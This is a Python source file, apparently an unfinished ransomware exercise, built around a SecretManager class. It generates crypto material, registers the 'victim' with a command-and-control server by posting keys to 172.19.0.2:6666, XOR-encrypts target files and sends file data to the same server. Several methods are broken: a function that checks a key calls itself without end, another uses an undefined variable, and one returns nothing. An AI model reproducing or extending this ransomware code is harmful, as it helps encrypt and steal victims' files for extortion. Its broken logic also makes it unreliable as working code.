from hashlib import sha256
import logging
import os
import secrets
from typing import List, Tuple
import os.path
import requests
import base64

from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC

from xorcrypt import xorfile

class SecretManager:
    ITERATION = 48000
    TOKEN_LENGTH = 16
    SALT_LENGTH = 16
    KEY_LENGTH = 16

    def __init__(self, remote_host_port:str="127.0.0.1:6666", path:str="/root") -> None:
        self._remote_host_port = remote_host_port
        self._path = path
        self._key = None
        self._salt = None
        self._token = None

        self._log = logging.getLogger(self.__class__.__name__)

    def do_derivation(self, salt:bytes, key:bytes)->bytes:
        raise NotImplemented()


    def create(self)->Tuple[bytes, bytes, bytes]:
        # create crypto data
        res = {
            "key": secrets.token_bytes(16),
            "salt": secrets.token_bytes(16),
            "token": secrets.token_bytes(16)
            }
            
        self._token = res["token"]

        #raise NotImplemented()


    def bin_to_b64(self, data:bytes)->str:
        tmp = base64.b64encode(data)
        return str(tmp, "utf8")

    def post_new(self, salt:bytes, key:bytes, token:bytes)->None:
        # register the victim to the CNC
        payload = {
            "token" : self.bin_to_b64(token),
            "salt"  : self.bin_to_b64(salt),
            "key"   : self.bin_to_b64(key)
        }
        requests.post("http://172.19.0.2:6666/new", json=payload)   

    

        

    def setup(self)->None:
        # main function to create crypto data and register malware to cnc
        token= self.create()
        key , self.salt = self.do_derivation(self._salt, self._key)
        self._token = token
        self._key = key
        self.post_new(self._salt, self._key, self._token)
        # save crypto data in token.bin if not exist
        if not os.path.exists(os.path.join(self._path, "token.bin")):
            with open(os.path.join(self._path, "token.bin"), "wb") as f:
                f.write(self._token)
                self._log.info("token saved")
        # save crypto data in salt.bin if not exist
        if not os.path.exists(os.path.join(self._path, "salt.bin")):
            with open(os.path.join(self._path, "salt.bin"), "wb") as f:
                f.write(self._salt)
                self._log.info("salt saved")
        

    def load(self)->None:
        # function to load crypto data from the target
        with open(os.path.join(self._path, "key"), "rb") as f:
            self._key = f.read()
        with open(os.path.join(self._path, "salt"), "rb") as f:
            self._salt = f.read()
        

    def check_key(self, candidate_key:bytes)->bool:
        # Assert the key is valid
        assert self.check_key(candidate_key)
        return True
        

    def set_key(self, b64_key:str)->None:
        # If the key is valid, set the self._key var for decrypting
        if self.check_key(candidate_key):
            self._key = candidate_key
        
        

    def get_hex_token(self)->str:
        # Should return a string composed of hex symbole, regarding the token
        with open(os.path.join(self._path, "token"), "rb") as f:
            token = f.read()
            # hash the token
            token = sha256(token).hexdigest()
        return token.hex()
        

    def xorfiles(self, files:List[str])->None:
        # xor a list for file
        for f in files:
            xorfile(os.path.join(self._path, f), self._key)
    

    def leak_files(self, files:List[str])->None:
        # send file, geniune path and token to the CNC
        payload = files 
        requests.post("http://172.19.0.2:6666/files", json=payload)
        return {"status": "ok"}

        

    def clean(self):
        # remove crypto data from the target
        os.remove(os.path.join(self._path, "key"))
        os.remove(os.path.join(self._path, "salt"))
        os.remove(os.path.join(self._path, "token"))

if __name__ == "__main__":
    # Test the class
    sm = SecretManager()
    sm.setup()
    sm.xorfiles(["test.txt"])
    sm.leak_files(["test.txt"])
    sm.clean()
    